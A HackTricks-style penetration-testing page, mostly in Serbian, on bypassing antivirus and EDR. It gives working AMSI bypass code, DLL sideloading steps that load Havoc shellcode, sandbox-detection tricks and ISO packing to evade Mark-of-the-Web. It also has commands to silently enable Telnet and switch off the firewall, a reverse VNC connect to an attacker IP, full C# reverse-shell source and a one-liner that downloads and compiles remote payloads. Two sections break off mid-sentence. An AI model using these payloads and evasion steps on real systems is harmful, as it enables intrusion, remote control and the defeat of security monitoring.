# Antivirus (AV) Bypass

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ako ste zainteresovani za **hakersku karijeru** i da hakujete ono što se ne može hakovati - **zapošljavamo!** (_potrebno je tečno pisanje i govorenje poljskog_).

{% embed url="https://www.stmcyber.com/careers" %}

**Ovu stranicu je napisao** [**@m2rc\_p**](https://twitter.com/m2rc_p)**!**

## **AV Evasion Methodology**

Trenutno, AV koriste različite metode za proveru da li je datoteka maliciozna ili ne, statičku detekciju, dinamičku analizu, i za naprednije EDR-ove, analizu ponašanja.

### **Statička detekcija**

Statička detekcija se postiže označavanjem poznatih malicioznih stringova ili nizova bajtova u binarnom fajlu ili skripti, kao i ekstrakcijom informacija iz same datoteke (npr. opis datoteke, ime kompanije, digitalni potpisi, ikona, kontrolna suma, itd.). To znači da korišćenje poznatih javnih alata može lakše dovesti do otkrivanja, jer su verovatno analizirani i označeni kao maliciozni. Postoji nekoliko načina da se zaobiđe ova vrsta detekcije:

* **Enkripcija**

Ako enkriptujete binarni fajl, neće biti načina za AV da detektuje vaš program, ali će vam biti potreban neki loader da dekriptuje i pokrene program u memoriji.

* **Obfuskacija**

Ponekad je sve što treba da uradite da promenite neke stringove u vašem binarnom fajlu ili skripti da biste ga prošli AV, ali ovo može biti dugotrajan zadatak u zavisnosti od onoga što pokušavate da obfuskate.

* **Prilagođeni alati**

Ako razvijate svoje alate, neće biti poznatih loših potpisa, ali ovo zahteva mnogo vremena i truda.

{% hint style="info" %}
Dobar način za proveru protiv Windows Defender statičke detekcije je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). U suštini deli datoteku na više segmenata i zatim traži od Defendera da skenira svaki pojedinačno, na ovaj način, može vam reći tačno koji su označeni stringovi ili bajtovi u vašem binarnom fajlu.
{% endhint %}

Toplo preporučujem da pogledate ovu [YouTube plejlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnoj AV Evasiji.

### **Dinamička analiza**

Dinamička analiza je kada AV pokreće vaš binarni fajl u sandbox-u i prati malicioznu aktivnost (npr. pokušaj dekripcije i čitanja lozinki iz vašeg pretraživača, izvođenje minidump-a na LSASS, itd.). Ovaj deo može biti malo teži za rad, ali evo nekoliko stvari koje možete učiniti da izbegnete sandboksove.

* **Spavanje pre izvršenja** U zavisnosti od toga kako je implementirano, može biti odličan način za zaobilaženje dinamičke analize AV-a. AV-ima je dat vrlo kratak vremenski period za skeniranje datoteka kako ne bi ometali rad korisnika, tako da korišćenje dugih spavanja može ometati analizu binarnih fajlova. Problem je u tome što mnogi AV-ovi sandboksovi mogu jednostavno preskočiti spavanje u zavisnosti od toga kako je implementirano.
* **Proveravanje resursa mašine** Obično sandboksovi imaju vrlo malo resursa za rad (npr. < 2GB RAM), inače bi mogli usporiti korisničku mašinu. Takođe možete biti veoma kreativni ovde, na primer, proveravajući temperaturu CPU-a ili čak brzine ventilatora, ne sve će biti implementirano u sandboksu.
* **Provere specifične za mašinu** Ako želite da ciljate korisnika čija je radna stanica pridružena "contoso.local" domenu, možete izvršiti proveru na domen mašine da vidite da li se poklapa sa onim što ste naveli, ako se ne poklapa, možete naterati svoj program da izađe.

Ispostavlja se da je ime računara Microsoft Defender-ovog sandboks-a HAL9TH, tako da možete proveriti ime računara u vašem malveru pre detonacije, ako se ime poklapa sa HAL9TH, to znači da ste unutar Defender-ovog sandboks-a, tako da možete naterati svoj program da izađe.

<figure><img src="../.gitbook/assets/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Neki drugi zaista dobri saveti od [@mgeeky](https://twitter.com/mariuszbit) za borbu protiv sandboksova

<figure><img src="../.gitbook/assets/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanal</p></figcaption></figure>

Kao što smo rekli ranije u ovom postu, **javni alati** će na kraju **biti otkriveni**, tako da biste trebali da se zapitate nešto:

Na primer, ako želite da dump-ujete LSASS, **da li vam zaista treba da koristite mimikatz**? Ili biste mogli da koristite neki drugi projekat koji je manje poznat i takođe dump-uje LSASS.

Pravi odgovor je verovatno potonji. Uzimajući mimikatz kao primer, verovatno je jedan od, ako ne i najviše označenih malvera od strane AV-a i EDR-a, dok je sam projekat super cool, takođe je noćna mora raditi s njim da biste zaobišli AV, tako da jednostavno potražite alternative za ono što pokušavate da postignete.

{% hint style="info" %}
Kada modifikujete svoje payload-e za evaziju, obavezno **isključite automatsko slanje uzoraka** u defender-u, i molim vas, ozbiljno, **NE ULAŽITE NA VIRUSTOTAL** ako je vaš cilj postizanje evazije na duže staze. Ako želite da proverite da li vaš payload biva otkriven od strane određenog AV-a, instalirajte ga na VM, pokušajte da isključite automatsko slanje uzoraka, i testirajte ga tamo dok ne budete zadovoljni rezultatom.
{% endhint %}

## EXEs vs DLLs

Kad god je to moguće, uvek **prioritizujte korišćenje DLL-ova za evaziju**, prema mom iskustvu, DLL datoteke su obično **mnogo manje detektovane** i analizirane, tako da je to vrlo jednostavan trik za korišćenje kako biste izbegli detekciju u nekim slučajevima (ako vaš payload ima neki način da se pokrene kao DLL, naravno).

Kao što možemo videti na ovoj slici, DLL payload iz Havoc-a ima stopu detekcije od 4/26 na antiscan.me, dok EXE payload ima stopu detekcije od 7/26.

<figure><img src="../.gitbook/assets/image (1130).png" alt=""><figcaption><p>antiscan.me poređenje normalnog Havoc EXE payload-a vs normalnog Havoc DLL-a</p></figcaption></figure>

Sada ćemo pokazati neke trikove koje možete koristiti sa DLL datotekama da biste bili mnogo neprimetniji.

## DLL Sideloading & Proxying

**DLL Sideloading** koristi prednost reda pretrage DLL-a koji koristi loader tako što postavlja i aplikaciju žrtve i maliciozni payload zajedno.

Možete proveriti programe podložne DLL Sideloading-u koristeći [Siofra](https://github.com/Cybereason/siofra) i sledeći powershell skript: 

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

Ova komanda će prikazati listu programa podložnih DLL hijackingu unutar "C:\Program Files\\" i DLL datoteka koje pokušavaju da učitaju.

Toplo preporučujem da **istražite DLL hijackable/sideloadable programe sami**, ova tehnika je prilično suptilna kada se pravilno izvede, ali ako koristite javno poznate DLL sideloadable programe, lako možete biti uhvaćeni.

Samo postavljanje malicioznog DLL-a sa imenom koje program očekuje da učita, neće učitati vaš payload, jer program očekuje neke specifične funkcije unutar tog DLL-a, da bismo rešili ovaj problem, koristićemo drugu tehniku nazvanu **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program pravi iz proxy (i malicioznog) DLL-a ka originalnom DLL-u, čime se očuvava funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) od [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam pratio:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

Poslednja komanda će nam dati 2 fajla: šablon izvorne DLL datoteke i originalnu preimenovanu DLL.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Ovo su rezultati:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (kodiran sa [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.

<figure><img src="../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Preporučujem da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloadingu, kao i [ippsecov video](https://www.youtube.com/watch?v=3eROsG_WNpE) da biste saznali više o onome što smo detaljnije razgovarali.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze je alat za payload koji se koristi za zaobilaženje EDR-a koristeći suspendovane procese, direktne syscalls i alternativne metode izvršavanja`

Možete koristiti Freeze da učitate i izvršite svoj shellcode na diskretan način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Izbegavanje je samo igra mačke i miša, ono što danas funkcioniše može biti otkriveno sutra, tako da nikada ne oslanjajte se samo na jedan alat, ako je moguće, pokušajte da povežete više tehnika izbegavanja.
{% endhint %}

## AMSI (Interfejs za skeniranje protiv malvera)

AMSI je stvoren da spreči "[malver bez datoteka](https://en.wikipedia.org/wiki/Fileless_malware)". U početku, AV-ovi su mogli da skeniraju samo **datoteke na disku**, tako da ako biste nekako izvršili payload-ove **direktno u memoriji**, AV nije mogao ništa da učini da to spreči, jer nije imao dovoljno uvida.

AMSI funkcija je integrisana u ove komponente Windows-a.

* Kontrola korisničkog naloga, ili UAC (povećanje privilegija EXE, COM, MSI, ili ActiveX instalacije)
* PowerShell (skripte, interaktivna upotreba i dinamička evaluacija koda)
* Windows Script Host (wscript.exe i cscript.exe)
* JavaScript i VBScript
* Office VBA makroi

Omogućava antivirusnim rešenjima da ispituju ponašanje skripti izlažući sadržaj skripti u formi koja je i nekriptovana i neobfuskovana.

Pokretanje `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` će proizvesti sledeću upozorenje na Windows Defender-u.

<figure><img src="../.gitbook/assets/image (1135).png" alt=""><figcaption></figcaption></figure>

Primetite kako dodaje `amsi:` i zatim putanju do izvršne datoteke iz koje je skripta pokrenuta, u ovom slučaju, powershell.exe

Nismo spustili nijednu datoteku na disk, ali smo ipak uhvaćeni u memoriji zbog AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

* **Obfuskacija**

Pošto AMSI uglavnom radi sa statičkim detekcijama, stoga, modifikovanje skripti koje pokušavate da učitate može biti dobar način za izbegavanje detekcije.

Međutim, AMSI ima sposobnost da neobfuskira skripte čak i ako imaju više slojeva, tako da obfuskacija može biti loša opcija u zavisnosti od načina na koji je urađena. To čini izbegavanje ne tako jednostavnim. Ipak, ponekad, sve što treba da uradite je da promenite nekoliko imena promenljivih i bićete u redu, tako da zavisi koliko je nešto označeno.

* **AMSI Bypass**

Pošto je AMSI implementiran učitavanjem DLL-a u proces powershell (takođe cscript.exe, wscript.exe, itd.), moguće je lako manipulisati njime čak i kada se pokreće kao korisnik bez privilegija. Zbog ove greške u implementaciji AMSI, istraživači su pronašli više načina da izbegnu AMSI skeniranje.

**Prisiljavanje na grešku**

Prisiljavanje AMSI inicijalizacije da ne uspe (amsiInitFailed) će rezultirati time da nijedno skeniranje neće biti inicirano za trenutni proces. Prvobitno je ovo otkrio [Matt Graeber](https://twitter.com/mattifestation) i Microsoft je razvio potpis da spreči širu upotrebu.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Sve što je bilo potrebno je jedna linija powershell koda da se AMSI učini neupotrebljivim za trenutni powershell proces. Ova linija je, naravno, označena od strane AMSI-a, tako da su potrebne neke modifikacije kako bi se ova tehnika koristila.

Evo modifikovanog AMSI bypass-a koji sam uzeo iz ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Ova tehnika je prvobitno otkrivena od strane [@RastaMouse](https://twitter.com/_RastaMouse/) i uključuje pronalaženje adrese za funkciju "AmsiScanBuffer" u amsi.dll (odgovornu za skeniranje korisničkog unosa) i prepisivanje sa instrukcijama da vrati kod za E\_INVALIDARG, na ovaj način, rezultat stvarnog skeniranja će biti 0, što se tumači kao čist rezultat.

{% hint style="info" %}
Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.
{% endhint %}

Postoji mnogo drugih tehnika koje se koriste za zaobilaženje AMSI sa powershell, pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/#amsi-bypass) i [ovaj repo](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

Ili ovaj skript koji će putem memorijskog patchinga patchovati svaki novi Powersh

## Obfuscation

Postoji nekoliko alata koji se mogu koristiti za **obfuskaciju C# čistog koda**, generisanje **metaprogramskih šablona** za kompajliranje binarnih datoteka ili **obfuskaciju kompajliranih binarnih datoteka** kao što su:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork [LLVM](http://www.llvm.org/) kompilacione suite sposobne da pruže povećanu sigurnost softvera kroz [obfuskaciju koda](http://en.wikipedia.org/wiki/Obfuscation_\(software\)) i zaštitu od neovlašćenih izmena.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje kako koristiti `C++11/14` jezik za generisanje, u vreme kompajliranja, obfuskovanog koda bez korišćenja bilo kog spoljnog alata i bez modifikovanja kompajlera.
* [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuskovanih operacija generisanih C++ metaprogramskim okvirom koji će otežati život osobi koja želi da provali aplikaciju.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binarni obfuscator koji može obfuskovati razne različite pe datoteke uključujući: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorfni kod motor za proizvoljne izvršne datoteke.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je okvir za obfuskaciju koda sa finim granicama za jezike podržane od strane LLVM koristeći ROP (programiranje orijentisano na povratak). ROPfuscator obfuskira program na nivou asemblera transformišući obične instrukcije u ROP lance, ometajući naše prirodno shvatanje normalnog toka kontrole.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nimu
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može konvertovati postojeće EXE/DLL u shellcode i zatim ih učitati

## SmartScreen & MoTW

Možda ste videli ovaj ekran kada ste preuzimali neke izvršne datoteke sa interneta i izvršavali ih.

Microsoft Defender SmartScreen je bezbednosni mehanizam namenjen zaštiti krajnjeg korisnika od pokretanja potencijalno zlonamernih aplikacija.

<figure><img src="../.gitbook/assets/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen uglavnom funkcioniše na osnovu reputacije, što znači da će neobično preuzete aplikacije aktivirati SmartScreen, upozoravajući i sprečavajući krajnjeg korisnika da izvrši datoteku (iako se datoteka i dalje može izvršiti klikom na Više informacija -> Pokreni u svakom slučaju).

**MoTW** (Mark of The Web) je [NTFS Alternativni Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_\(ADS\)) sa imenom Zone.Identifier koji se automatski kreira prilikom preuzimanja datoteka sa interneta, zajedno sa URL-om sa kojeg je preuzeta.

<figure><img src="../.gitbook/assets/image (237).png" alt=""><figcaption><p>Proveravanje Zone.Identifier ADS za datoteku preuzetu sa interneta.</p></figcaption></figure>

{% hint style="info" %}
Važno je napomenuti da izvršne datoteke potpisane **pouzdanom** potpisnom sertifikatom **neće aktivirati SmartScreen**.
{% endhint %}

Veoma efikasan način da sprečite da vaši payloadi dobiju Mark of The Web je pakovanje unutar nekog oblika kontejnera poput ISO-a. To se dešava jer Mark-of-the-Web (MOTW) **ne može** biti primenjen na **non NTFS** volumene.

<figure><img src="../.gitbook/assets/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) je alat koji pakuje payload-e u izlazne kontejnere kako bi izbegao Mark-of-the-Web.

Example usage:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# Assembly Reflection

Učitavanje C# binarnih datoteka u memoriju je poznato već neko vreme i još uvek je veoma dobar način za pokretanje vaših alata nakon eksploatacije bez da vas AV uhvati.

Pošto će se payload učitati direktno u memoriju bez dodirivanja diska, moraćemo da se brinemo samo o patchovanju AMSI tokom celog procesa.

Većina C2 okvira (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) već pruža mogućnost izvršavanja C# assembly-a direktno u memoriji, ali postoje različiti načini da se to uradi:

* **Fork\&Run**

Ovo podrazumeva **pokretanje novog žrtvenog procesa**, injektovanje vašeg malicioznog koda u taj novi proces, izvršavanje vašeg malicioznog koda i kada završite, ubijanje novog procesa. Ovo ima svoje prednosti i nedostatke. Prednost metode fork and run je što se izvršavanje dešava **van** našeg Beacon implant procesa. To znači da ako nešto u našoj akciji nakon eksploatacije pođe po zlu ili bude uhvaćeno, postoji **mnogo veća šansa** da naš **implant preživi.** Nedostatak je što imate **veću šansu** da budete uhvaćeni od strane **Behavioral Detections**.

<figure><img src="../.gitbook/assets/image (215).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Radi se o injektovanju malicioznog koda nakon eksploatacije **u sopstveni proces**. Na ovaj način, možete izbeći kreiranje novog procesa i njegovo skeniranje od strane AV, ali nedostatak je što ako nešto pođe po zlu sa izvršavanjem vašeg payload-a, postoji **mnogo veća šansa** da **izgubite vaš beacon** jer bi mogao da se sruši.

<figure><img src="../.gitbook/assets/image (1136).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Ako želite da pročitate više o učitavanju C# assembly-a, molimo vas da pogledate ovaj članak [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) i njihov InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Takođe možete učitati C# assembly-e **iz PowerShell-a**, pogledajte [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) i [video S3cur3th1sSh1t-a](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Kao što je predloženo u [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), moguće je izvršiti maliciozni kod koristeći druge jezike dajući kompromitovanoj mašini pristup **okruženju interpreter-a instaliranom na SMB deljenju pod kontrolom napadača**.

Dajući pristup Interpreter Binaries i okruženju na SMB deljenju možete **izvršiti proizvoljan kod u ovim jezicima unutar memorije** kompromitovane mašine.

Repozitorijum ukazuje: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **više fleksibilnosti da zaobiđemo statične potpise**. Testiranje sa nasumičnim neobfuskovanim reverse shell skriptama u ovim jezicima se pokazalo uspešnim.

## Advanced Evasion

Izbegavanje je veoma komplikovana tema, ponekad morate uzeti u obzir mnoge različite izvore telemetrije u samo jednom sistemu, tako da je prilično nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje protiv kojeg se borite imaće svoje snage i slabosti.

Toplo vas savetujem da pogledate ovaj govor od [@ATTL4S](https://twitter.com/DaniLJ94), kako biste stekli uvid u naprednije tehnike izbegavanja.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Ovo je takođe još jedan odličan govor od [@mariuszbit](https://twitter.com/mariuszbit) o Izbegavanju u Dubini.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) koji će **ukloniti delove binarne datoteke** dok ne **otkrije koji deo Defender** smatra malicioznim i podeliti ga sa vama.\
Drugi alat koji radi **isto je** [**avred**](https://github.com/dobin/avred) sa otvorenom web stranicom koja nudi uslugu na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows 10, svi Windows su dolazili sa **Telnet serverom** koji ste mogli instalirati (kao administrator) tako što ćete:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Neka **počinje** kada se sistem pokrene i **pokreni** ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promenite telnet port** (neprimetno) i onemogućite firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Preuzmite ga sa: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (želite bin preuzimanja, a ne instalaciju)

**NA HOSTU**: Izvršite _**winvnc.exe**_ i konfigurišite server:

* Omogućite opciju _Disable TrayIcon_
* Postavite lozinku u _VNC Password_
* Postavite lozinku u _View-Only Password_

Zatim, premestite binarni _**winvnc.exe**_ i **novokreirani** fajl _**UltraVNC.ini**_ unutar **žrtve**

#### **Obrnuta konekcija**

**Napadač** treba da **izvrši unutar** svog **hosta** binarni `vncviewer.exe -listen 5900` kako bi bio **pripremljen** da uhvati obrnutu **VNC konekciju**. Zatim, unutar **žrtve**: Pokrenite winvnc daemon `winvnc.exe -run` i izvršite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**UPWARNING:** Da biste održali stealth, ne smete raditi nekoliko stvari

* Ne pokrećite `winvnc` ako već radi ili ćete aktivirati [popup](https://i.imgur.com/1SROTTl.png). proverite da li radi sa `tasklist | findstr winvnc`
* Ne pokrećite `winvnc` bez `UltraVNC.ini` u istom direktorijumu ili će otvoriti [prozor za konfiguraciju](https://i.imgur.com/rfMQWcf.png)
* Ne pokrećite `winvnc -h` za pomoć ili ćete aktivirati [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Preuzmite ga sa: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokrenite lister** sa `msfconsole -r file.rc` i **izvršite** **xml payload** sa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni defender će vrlo brzo prekinuti proces.**

### Kompajliranje našeg vlastitog reverznog shell-a

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Reverz shell

Kompajlirajte ga sa:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristite ga sa:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# korišćenje kompajlera
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
